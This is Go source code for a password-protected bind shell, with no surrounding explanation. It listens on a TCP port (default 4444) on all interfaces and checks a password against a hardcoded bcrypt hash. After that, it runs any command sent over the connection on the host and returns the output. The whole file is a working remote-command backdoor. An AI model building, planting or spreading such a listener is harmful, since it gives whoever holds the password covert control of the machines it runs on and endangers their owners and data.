package main

import (
	"errors"
	"flag"
	"fmt"
	"golang.org/x/crypto/bcrypt"
	"net"
	"os"
	"os/exec"
)

const HASH string = "$2a$06$4spPOGAU1/KuhTgoYY02rOSgqYgw5QQmnaL2mQiBfollXaLAhjFTK"

func main() {
	// Get command line arguments
	host := flag.String("host", "0.0.0.0", "Host to listen on")
	port := flag.String("port", "4444", "Port to listen on")
	flag.Parse()

	server(*host, *port)
}

func server(host, port string) {
	// Listen for incoming connections
	server, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Error creating server:", err.Error())
		os.Exit(1)
	}
	defer server.Close()
	fmt.Println("Server listening on " + host + ":" + port)

	// wait for first connection
	connection, err := server.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err.Error())
		os.Exit(1)
	}
	
	authed := authenticate_user(connection)
	if authed {
		for {
			buffer := make([]byte, 4096)
			mLen, err := connection.Read(buffer)
			if err != nil {
				if mLen == 0 {
					connection.Close()
					connection, err = server.Accept()
					if err != nil {
						fmt.Println("Error accepting connection:", err.Error())
						os.Exit(1)
					}

					authed = authenticate_user(connection)
					if !authed { break }
					continue
				}
				fmt.Println("Error reading message:", err.Error())
				continue
			}

			message := string(buffer[:mLen])
			args, err := parseCommandLine(message)
			if err != nil {
				fmt.Println("Error parsing message:", err.Error())
			}

			// Special case because cd is a shell built-in
			if args[0] == "cd" {
				if len(args) > 1 {
					os.Chdir(args[1])
				}
				connection.Write([]byte(" \b"))
			} else {
				proc := exec.Command(args[0], args[1:]...)
				output, _ := proc.CombinedOutput()

				if len(output) > 0 {
					connection.Write(output)
				} else {
					connection.Write([]byte(" \b"))
				}
			}
		}
	} else {
		connection.Write([]byte("Failed to many times, closing connection"))
		connection.Close()
	}
}

func authenticate_user(connection net.Conn) bool {
	connection.Write([]byte("Please enter the password"))
	for i := 0; i < 3; i++ {
		buffer := make([]byte, 16)
		mLen, _ := connection.Read(buffer)

		password := buffer[:mLen-1]
		diff := bcrypt.CompareHashAndPassword([]byte(HASH), password)
		if diff == nil {
			connection.Write([]byte("Confirmed"))
			return true
		}
		connection.Write([]byte(fmt.Sprintf("Wrong password, %d attempts remaining", 3-(i+1))))
	}

	return false
}

func parseCommandLine(command string) ([]string, error) {
	var args []string
	state := "start"
	current := ""
	quote := "\""
	escapeNext := true

	for i := 0; i < len(command); i++ {
		c := command[i]

		if state == "quotes" {
			if string(c) != quote {
				current += string(c)
			} else {
				args = append(args, current)
				current = ""
				state = "start"
			}
			continue
		}

		if escapeNext {
			current += string(c)
			escapeNext = false
			continue
		}

		if c == '\\' {
			escapeNext = true
			continue
		}

		if c == '"' || c == '\'' {
			state = "quotes"
			quote = string(c)
			continue
		}

		if state == "arg" {
			if c == ' ' || c == '\t' {
				args = append(args, current)
				current = ""
				state = "start"
			} else {
				current += string(c)
			}
			continue
		}

		if c != ' ' && c != '\t' {
			state = "arg"
			current += string(c)
		}
	}

	if state == "quotes" {
		return []string{}, errors.New(fmt.Sprintf("Unclosed quote in command line: %s", command))
	}

	if current != "" {
		args = append(args, current)
	}

	return args, nil
}
